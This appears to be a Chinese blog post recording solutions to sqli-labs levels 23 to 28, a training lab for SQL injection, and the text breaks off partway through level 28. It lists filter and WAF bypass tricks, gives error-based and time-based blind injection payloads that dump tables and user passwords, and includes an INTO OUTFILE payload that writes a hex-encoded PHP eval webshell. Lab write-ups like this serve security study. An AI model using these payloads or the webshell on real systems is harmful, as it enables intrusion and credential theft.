

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
  <link rel="icon" type="image/png" href="/img/head.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="SE_Null">
  <meta name="keywords" content="">
  <title>sql-labs记录2 - SE_Null</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>SE_Null</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/5.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-01-02 00:27" pubdate>
        January 2, 2020 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      5.2k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      69
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">sql-labs记录2</h1>
            
            <div class="markdown-body" id="post-body">
              <p>本文记录sqL-Labs的23-53关，这个系列开始不会一步步按照sql注入的步骤来了，会直接给出结果和思路。</p>
<a id="more"></a>

<h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-绕过sql过滤与转义"><a href="#1-绕过sql过滤与转义" class="headerlink" title="1.绕过sql过滤与转义"></a>1.绕过sql过滤与转义</h3><p>为了防止sql注入攻击，往往在与数据库进行交互之前会进行参数转义过滤等操作。</p>
<h4 id="1-绕过关键字过滤"><a href="#1-绕过关键字过滤" class="headerlink" title="1.绕过关键字过滤"></a>1.绕过关键字过滤</h4><p>1.注释符绕过：sel/**/ect</p>
<p>2.大小写绕过：SelEct</p>
<p>3.双写绕过：selselectect</p>
<p>4.符号绕过：and&lt;=&gt;&amp;&amp;，or&lt;=&gt;||，xor&lt;=&gt;|，not&lt;=&gt;!</p>
<p>5.尖括号绕过：sele&lt;&gt;ct</p>
<p>6.编码绕过：url编码绕过、16进制编码绕过、ASCII编码绕过、HEX、unicode编码绕过</p>
<p>7.等价函数绕过</p>
<pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">hex</span><span class="hljs-params">()</span>、<span class="hljs-title">bin</span><span class="hljs-params">()</span> ==&gt; <span class="hljs-title">ascii</span><span class="hljs-params">()</span></span>
<span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">()</span> ==&gt;<span class="hljs-title">benchmark</span><span class="hljs-params">()</span></span>
<span class="hljs-function"><span class="hljs-title">concat_ws</span><span class="hljs-params">()</span>==&gt;<span class="hljs-title">group_concat</span><span class="hljs-params">()</span></span>
<span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">()</span>、<span class="hljs-title">substr</span><span class="hljs-params">()</span> ==&gt; <span class="hljs-title">substring</span><span class="hljs-params">()</span></span>
<span class="hljs-function">@@<span class="hljs-title">user</span> ==&gt; <span class="hljs-title">user</span><span class="hljs-params">()</span></span>
<span class="hljs-function">@@<span class="hljs-title">datadir</span> ==&gt; <span class="hljs-title">datadir</span><span class="hljs-params">()</span></span>
<span class="hljs-function">还有参考下面的绕过逗号过滤，这些都是相通的</span></code></pre>

<p>8.生僻函数代替，例如报错注入中的polygon</p>
<h4 id="2-绕过特殊字符过滤"><a href="#2-绕过特殊字符过滤" class="headerlink" title="2.绕过特殊字符过滤"></a>2.绕过特殊字符过滤</h4><p>1.绕过注释符过滤：</p>
<pre><code class="hljs angelscript">使用<span class="hljs-keyword">or</span>‘<span class="hljs-number">1</span>代替注释符</code></pre>

<p>1.绕过空格过滤：</p>
<pre><code class="hljs angelscript">双空格、<span class="hljs-comment">/**/</span>代替空格、()代替空格、回车代替空格、tab代替空格、`代替空格
编码代替空格:
%<span class="hljs-number">09</span> TAB（水平），%<span class="hljs-number">0</span>a 新建一行，%<span class="hljs-number">0</span>c 新的一页，%<span class="hljs-number">0</span>d <span class="hljs-keyword">return</span>功能，%<span class="hljs-number">0</span>b TAB键(垂直),%a0 空格</code></pre>

<p>2.绕过引号过滤：</p>
<pre><code class="hljs lsl">编码进行绕过
<span class="hljs-number">16</span>进制绕过：table_name=<span class="hljs-string">&quot;users&quot;</span>等价于table_name=<span class="hljs-number">0x7573657273</span>因为hex(users)=<span class="hljs-number">7573657273</span>
宽字节注入</code></pre>

<p>3.绕过逗号过滤：</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">join</span>代替逗号
<span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len：substr(&quot;string&quot;,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)等价于substr(&quot;string&quot; <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">3</span>)
<span class="hljs-keyword">like</span>：ascii(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">114</span>等价于 <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> &quot;r%&quot;
<span class="hljs-keyword">offset</span>：<span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>等价于<span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">2</span>。适用于<span class="hljs-keyword">limit</span>中的逗号被过滤的情况</code></pre>

<p>4.绕过等号过滤：<code>like</code>代替、<code>rlike</code>代替(模糊匹配)、<code>regexp</code>代替、<code>&lt;&gt;</code>等价于!=：!(id&lt;&gt;1)、<code>strcmp(str1,str2)</code>、<code>between   and</code>、<code>in</code></p>
<p>5.绕过<code>&lt;</code>、<code>&gt;</code>过滤：</p>
<pre><code class="hljs sql">greatest(n1,n2,n3,...) :返回其中的最大值
strcmp(str1,str2) :当str1=str2，返回0，当str1&gt;str2，返回1，当str1&lt;str2，返回-1
in 操作符
between   and	:选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。
least(n1,n2,n3…):返回n中的最小值</code></pre>



<h4 id="3-寻找网站源ip绕过waf"><a href="#3-寻找网站源ip绕过waf" class="headerlink" title="3.寻找网站源ip绕过waf"></a>3.寻找网站源ip绕过waf</h4><p>对于具有云WAF防护的网站，只要找到网站的IP地址，通过IP访问网站，就可以绕过云WAF检测。</p>
<p>常见的寻找网站IP的方法由以下几种</p>
<ul>
<li>寻找网站的历史解析记录</li>
<li>多个不同区域ping网站，查看IP解析的结果</li>
<li>找网站的二级域名、NS、MX记录等对应的IP</li>
<li>订阅网站邮件，查看邮件发送方的IP</li>
</ul>
<h4 id="4-HTTP参数污染"><a href="#4-HTTP参数污染" class="headerlink" title="4.HTTP参数污染"></a>4.HTTP参数污染</h4><p>HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。index.php?id=1&amp;id=2获取到的参数具体如下图所示：</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210220124830619.png" srcset="/img/loading.gif" alt="image-20210220124830619"></p>
<h4 id="5-另寻注入点"><a href="#5-另寻注入点" class="headerlink" title="5.另寻注入点"></a>5.另寻注入点</h4><p>往往对url请求过滤比较严重，对http头的过滤不是很严格，前提是将http的内容存进数据库。</p>
<h3 id="2-二次注入"><a href="#2-二次注入" class="headerlink" title="2.二次注入"></a>2.二次注入</h3><p>利用条件：</p>
<p>（1）向数据库成功插入恶意语句</p>
<p>（2）数据库取出数据时不进行转义或者过滤</p>
<p>攻击过程：</p>
<p>黑客寻找注入点向数据库中插入恶意代码，再向数据库做第二次请求将第一次注入的代码调用出来即可。</p>
<h3 id="3-宽字节注入"><a href="#3-宽字节注入" class="headerlink" title="3.宽字节注入"></a>3.宽字节注入</h3><p>利用条件：PHP连接MySQL的时候，设置了“set character_set_client = gbk”</p>
<p>原因：设置gbk之后，会导致编码转换的问题，gbk编码会认为两个ascii码为一个汉字，而必要条件是前一个ascii码大于 128 才能到汉字的范围。</p>
<p>利用：我们在过滤恶意url请求时，往往会将如<code>&#39;</code>进行转义<code>\&#39;</code>，而我们此时利用就是将其转义符给吃掉，有两种方法：</p>
<p>1.%df 。 urlencode(‘) = %5c%27，%df%5c 在 GBK 编码方式的时候会将其编码为一个汉字。<code>%23</code>是<code>#</code>。另外还可以替代%df有：%E6，%99</p>
<p>2.过滤掉\。例如可以构造 %df%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</p>
<p>通常两种提交方式：GET，POST都适用</p>
<p> 默认地，PHP对所有的GET、POST和COOKIE数据自动运行<code>addslashes()</code>。所以不应对已转义过的字符串使用<code>addslashes()</code>，因为这样会导致双层转义。遇到这种情况时可以使用函数<code>get_magic_quotes_gpc()</code>进行检测。</p>
<p>防御宽字节漏洞：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SET</span> character_set_connection=gbk,character_set_result=gbk,character_set_client=<span class="hljs-built_in">binary</span>
<span class="hljs-comment">#设置binary的目的是mysql不区分大小写，使用binary将字符串先转换为二进制字符串，即可避免</span></code></pre>



<h3 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4.堆叠注入"></a>4.堆叠注入</h3><p>简单的说就是让多条语句一起执行。mssql、SQL server、Postgresql支持，而Oracle不支持。</p>
<p>类似union联合查询，但是union两边需要受限制，而堆叠不必，可以为任意增删改查。</p>
<p>可以看一下这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p>
<p>另外，执行sql函数必须是<code>mysqli_multi_query()</code>(函数执行一个或多个针对数据库的查询,多个查询用分号进行分隔)。</p>
<h3 id="5-order-by-注入"><a href="#5-order-by-注入" class="headerlink" title="5.order by 注入"></a>5.order by 注入</h3><p>以sql 语句为例<code>$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</code><br>试<code>?sort=1 desc 或者 asc</code>，显示结果不同，则表明可以注入。<br>我们可利用 order by 后的一些参数进行注入</p>
<p><strong>注入方法</strong></p>
<ul>
<li><p>直接添加注入语句，?sort=(select <strong>**</strong>)</p>
</li>
<li><p>利用一些函数。例如 rand()函数等。?sort=rand(sql 语句)<br>比如说rand(true/false)</p>
</li>
<li><p>利用 and，例如?sort=1 and (sql 语句)。</p>
</li>
<li><p>使用报错注入等方式，但需要有报错</p>
</li>
<li><p>导出文件 into outfile 参数注入</p>
<ul>
<li><pre><code>?sort=1 into outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.txt&quot;
<pre><code class="hljs php-template">
<span class="xml">- 利用 lines terminated by导出小马</span>

<span class="xml">  ```sql</span>
<span class="xml">  ?sort=1 into outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.php&quot; lines terminated by 0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e</span>
<span class="xml">  #lines terminates by将每行以指定字符串结尾</span>
<span class="xml">  #0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e = hex(</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">)</span></code></pre>

</code></pre>
</li>
</ul>
</li>
<li><p>procedure analyse参数后注入</p>
<ul>
<li><p>通常我们可以利用它与sort函数一起执行报错注入<br>procedure analyse()函数是MySQL内置的对MySQL字段值进行统计分析后给出建议的字段类型。<br>语法:</p>
<pre><code class="hljs sql">procesure analyse(max_elements,max_memory)
max_elements：指定每列非重复值的最大值，当超过这个值的时候，MySQL不会推荐enum类型。
max_memory：analyse()为每列找出所有非重复值所采用的最大内存大小。</code></pre>

<p>用法</p>
<pre><code class="hljs sql">?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</code></pre>





</li>
</ul>
</li>
</ul>
<h2 id="2-靶场记录"><a href="#2-靶场记录" class="headerlink" title="2.靶场记录"></a>2.靶场记录</h2><h3 id="Less23：GET基于报错-过滤注释符-单引号"><a href="#Less23：GET基于报错-过滤注释符-单引号" class="headerlink" title="Less23：GET基于报错-过滤注释符(单引号)"></a>Less23：GET基于报错-过滤注释符(单引号)</h3><p>根据报错信息可以看到是单引号闭合，但是注释符被过滤了</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210220185228076.png" srcset="/img/loading.gif" alt="image-20210220185228076"></p>
<p>注释符被过滤只有采取后闭合了</p>
<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210220185337477.png" srcset="/img/loading.gif" alt="image-20210220185337477"></p>
<p>后续的爆表可以参考前面的系列了</p>
<h3 id="Less24：POST二次注入"><a href="#Less24：POST二次注入" class="headerlink" title="Less24：POST二次注入"></a>Less24：POST二次注入</h3><p>二次注入就是提前在数据库中插入恶意语句，再次提出来就🆗，本关所以先注册一个<code>admin&#39; #</code>的账户，后续使用此账户登录再修改此账户的密码即可实现修改admin密码。原理如下：</p>
<pre><code class="hljs sql">插入数据库
<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span> ( <span class="hljs-string">&quot;admin\&#x27; #&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>) <span class="hljs-keyword">values</span>(\<span class="hljs-string">&quot;$username\&quot;</span>, \<span class="hljs-string">&quot;$pass\&quot;</span>);
更新信息：
<span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-comment">#&#x27; and password=&#x27;$curr_pass&#x27;;</span>
也即
<span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span></code></pre>



<p>这里有一个疑问，为什么后台使用了<code>mysql_escape_string()</code>没有过滤掉特殊符号<code>&#39;#</code>呢？经过实验使用有以下结果</p>
<pre><code class="hljs sql">$a=mysql_escape_string($_GET[&#x27;a&#x27;]);		<span class="hljs-comment">#$a=admin\&#x27;</span>
$a=mysql_escape_string($_POST[&#x27;a&#x27;]);	<span class="hljs-comment">#$a=admin\&#x27; #</span>
$a=mysql_real_escape_string($_GET[&#x27;a&#x27;]);	<span class="hljs-comment">#$a=admin\&#x27;</span>
$a=mysql_real_escape_string($_POST[&#x27;a&#x27;]);	<span class="hljs-comment">#$a=admin\&#x27; #</span></code></pre>

<p><code>mysql_escape_string()和mysql_real_escape_string()</code>采取GET传递参数得到的结果是<code>\&#39;</code>，使用POST提交后虽然结果是<code>\&#39;#</code>，但是这在数据库插入语句里面恰恰代表转义，所以此次存入数据库是<code>admin&#39; #</code>。</p>
<h3 id="Less25：GET基于报错字符型-过滤and和or-单引号"><a href="#Less25：GET基于报错字符型-过滤and和or-单引号" class="headerlink" title="Less25：GET基于报错字符型-过滤and和or(单引号)"></a>Less25：GET基于报错字符型-过滤and和or(单引号)</h3><p>如题目所示，过滤and和or，其实还过滤了#、–+，没有过滤<code>-- </code>注释</p>
<p>但是题目是考察and和or过滤怎么办，所以乖乖做吧</p>
<p>经过实验，双写and和or，||，可以绕过过滤。</p>
<p>但是现实中如果过不了可以考虑不用and和or</p>
<h3 id="Less25a：盲注-过滤and和or"><a href="#Less25a：盲注-过滤and和or" class="headerlink" title="Less25a：盲注-过滤and和or"></a>Less25a：盲注-过滤and和or</h3><p>这一关和上一关一样，只是是数字型注入。</p>
<p>采用时间盲注和联合查询都🆗</p>
<h3 id="Less26：GET基于报错-过滤空格和注释"><a href="#Less26：GET基于报错-过滤空格和注释" class="headerlink" title="Less26：GET基于报错-过滤空格和注释"></a>Less26：GET基于报错-过滤空格和注释</h3><p>这一关三种注释方法都过滤了，所以只能考虑闭合了，而且还简单的过滤了and和or，但是实验双写and和or可以绕过。</p>
<p>但是本人把已知的所有可以代替空格的都试了一遍都不行就他妈离谱。。。</p>
<p>鉴于此采取报错注入吧</p>
<p>payload</p>
<pre><code class="hljs sql">数据库
?id=1&#x27;oorr(extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>)))aandnd <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span>
<span class="hljs-string">表</span>
<span class="hljs-string">?id=1&#x27;</span>oorr(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>)))aandnd<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span>
<span class="hljs-string">字段</span>
<span class="hljs-string">?id=1&#x27;</span>oorr(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())aandnd(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">0x7e</span>)))aandnd<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span>
<span class="hljs-string">用户名</span>
<span class="hljs-string">?id=1&#x27;</span>oorr(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">0x7e</span>)))aandnd<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span>
<span class="hljs-string">密码</span>
<span class="hljs-string">?id=1&#x27;</span>oorr(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">group_concat</span>(passwoorrd))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">0x7e</span>)))aandnd<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre>

<p><img src="/2020/01/02/sql-labs%E8%AE%B0%E5%BD%952/image-20210221020630487.png" srcset="/img/loading.gif" alt="image-20210221020630487"></p>
<p>结果可行的。</p>
<h3 id="Less26a：盲注-过滤空格和注释"><a href="#Less26a：盲注-过滤空格和注释" class="headerlink" title="Less26a：盲注-过滤空格和注释"></a>Less26a：盲注-过滤空格和注释</h3><p>太难了。。。不显示错误就不能用报错了，延时注入吧。</p>
<h3 id="Less27：GET基于报错-过滤union和select"><a href="#Less27：GET基于报错-过滤union和select" class="headerlink" title="Less27：GET基于报错-过滤union和select"></a>Less27：GET基于报错-过滤union和select</h3><p>题目告诉我们本关卡过滤了 union 和 select，其实还有空格，经过实验大小写可以绕过，报错注入</p>
<p>payload如下</p>
<pre><code class="hljs sql">表
?id=1&#x27;and(extractvalue(1,concat(0x7e,(<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">group_concat</span>(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>)))<span class="hljs-keyword">and</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span>
<span class="hljs-string">字段</span>
<span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span>(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">group_concat</span>(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">and</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">0x7e</span>)))<span class="hljs-keyword">and</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span>
<span class="hljs-string">用户名</span>
<span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span>(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">group_concat</span>(username))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">0x7e</span>)))<span class="hljs-keyword">and</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span>
<span class="hljs-string">密码</span>
<span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span>(extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)),<span class="hljs-number">0x7e</span>)))<span class="hljs-keyword">and</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre>





<h3 id="Less27a：盲注-过滤union和select"><a href="#Less27a：盲注-过滤union和select" class="headerlink" title="Less27a：盲注-过滤union和select"></a>Less27a：盲注-过滤union和select</h3><p>时间盲注</p>
<pre><code class="hljs sql">表
?id=1&quot;and(if(ascii(substr((<span class="hljs-keyword">SeLect</span>(table_name)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">SeLect</span>(table_name)(table_rows)<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">and</span>(table_rows=<span class="hljs-number">14</span>))a),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">117</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span><span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span>
<span class="hljs-string">字段</span>
<span class="hljs-string">?id=1&quot;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(column_name)<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>()) <span class="hljs-keyword">and</span>(table_name=<span class="hljs-string">&#x27;users&#x27;</span>)<span class="hljs-keyword">and</span>(ordinal_position=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">105</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span><span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span>
<span class="hljs-string">用户名</span>
<span class="hljs-string">?id=1&quot;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>((<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(username)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span><span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span>
<span class="hljs-string">密码</span>
<span class="hljs-string">?id=1&quot;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>((<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">SeLect</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span><span class="hljs-string">&quot;1&quot;</span>=<span class="hljs-string">&quot;1</span></code></pre>

<p>手工注入很麻烦的，建议用以上payload到burp抓包进行爆破，用burp抓包爆破可以改一下payload不用时间盲注。</p>
<h3 id="Less28：GET基于报错字符型-过滤union和select-带括号的单引号"><a href="#Less28：GET基于报错字符型-过滤union和select-带括号的单引号" class="headerlink" title="Less28：GET基于报错字符型-过滤union和select(带括号的单引号)"></a>Less28：GET基于报错字符型-过滤union和select(带括号的单引号)</h3><p>这一关题目虽然是说过滤union和select，结果一试把注释和空格也给过了，而且也没有报错信息。。。就时间盲注吧</p>
<p>payload如下：</p>
<pre><code class="hljs sql">表
?id=1&#x27;)and(if(ascii(substr((<span class="hljs-keyword">SeLect</span>(table_name)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">SeLect</span>(table_name),(table_rows)<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())<span class="hljs-keyword">and</span>(table_rows=<span class="hljs-number">14</span>))a),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">117</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>))<span class="hljs-keyword">and</span>(<span class="hljs-string">&#x27;1&#x27;</span>)=(<span class="hljs-string">&#x27;1</span>
<span class="hljs-string">字段</span>
